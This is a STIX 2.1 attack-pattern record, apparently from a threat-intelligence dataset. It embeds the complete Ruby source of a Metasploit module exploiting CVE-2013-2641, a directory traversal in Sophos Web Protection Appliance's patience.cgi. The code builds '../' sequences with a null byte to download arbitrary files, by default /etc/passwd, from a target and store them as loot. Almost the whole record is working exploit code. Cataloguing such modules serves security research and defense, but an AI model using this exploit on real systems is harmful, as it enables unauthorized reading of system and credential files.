{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46948cfd-51c0-4f17-bce1-2b6b5748f164",
    "created": "2024-08-14T16:23:02.241519Z",
    "modified": "2024-08-14T16:23:02.241523Z",
    "name": "Sophos Web Protection Appliance patience.cgi Directory Traversal",
    "description": " This module abuses a directory traversal in Sophos Web Protection Appliance, specifically on the /cgi-bin/patience.cgi component. This module has been tested successfully on the Sophos Web Virtual Appliance v3.7.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/sophos_wpa_traversal.rb",
            "external_id": "sophos_wpa_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2641"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20130603041204/http://www.sophos.com/en-us/support/knowledgebase/118969.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20140701204340/https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sophos Web Protection Appliance patience.cgi Directory Traversal',\n        'Description' => %q{\n          This module abuses a directory traversal in Sophos Web Protection Appliance, specifically\n          on the /cgi-bin/patience.cgi component. This module has been tested successfully on the\n          Sophos Web Virtual Appliance v3.7.0.\n        },\n        'Author' => [\n          'Wolfgang Ettlingers', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2013-2641' ],\n          [ 'OSVDB', '91953' ],\n          [ 'BID', '58833' ],\n          [ 'EDB', '24932' ],\n          [ 'URL', 'https://web.archive.org/web/20130603041204/http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],\n          [ 'URL', 'https://web.archive.org/web/20140701204340/https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]\n        ],\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'DisclosureDate' => '2013-04-03'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/passwd']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 2])\n      ]\n    )\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, '/'))\n  end\n\n  def is_proficy?\n    res = send_request_cgi(\n      {\n        'uri' => '/cgi-bin/patience.cgi',\n        'method' => 'GET'\n      }\n    )\n\n    if res && (res.code == 307) && res.body =~ (/The patience page request was not valid/)\n      return true\n    else\n      return false\n    end\n  end\n\n  def read_file(file)\n    travs = ''\n    travs << '../' * datastore['DEPTH']\n    travs << file\n    travs << '%00'\n\n    print_status('Retrieving file contents...')\n\n    res = send_request_cgi(\n      {\n        'uri' => '/cgi-bin/patience.cgi',\n        'method' => 'GET',\n        'encode_params' => false,\n        'vars_get' => {\n          'id' => travs\n        }\n      }\n    )\n\n    if res && ((res.code == 200) || (res.code == 500)) && res.headers['X-Sophos-PatienceID']\n      return res.body\n    else\n      print_status(\"#{res.code}\\n#{res.body}\")\n      return nil\n    end\n  end\n\n  def run\n    print_status(\"Checking if it's a Sophos Web Protect Appliance with the vulnerable component...\")\n    if is_proficy?\n      print_good('Check successful')\n    else\n      print_error('Sophos Web Protect Appliance vulnerable component not found')\n      return\n    end\n\n    contents = read_file(datastore['FILEPATH'])\n    if contents.nil?\n      print_error('File not downloaded')\n      return\n    end\n\n    file_name = my_basename(datastore['FILEPATH'])\n    path = store_loot(\n      'sophos.wpa.traversal',\n      'application/octet-stream',\n      rhost,\n      contents,\n      file_name\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-03"
}